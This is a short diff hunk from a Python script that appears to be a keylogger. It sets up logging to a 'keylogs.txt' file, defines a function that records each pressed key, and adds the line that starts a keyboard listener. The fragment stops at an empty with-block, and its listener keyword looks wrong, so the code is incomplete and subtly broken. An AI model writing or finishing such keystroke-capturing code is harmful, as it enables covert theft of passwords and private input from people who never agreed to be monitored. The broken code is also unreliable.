@@ -7,3 +7,5 @@ logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, for
 
 def press(key):
 	logging.info(str(key))
+	
+with Listener(press=press) as listener:
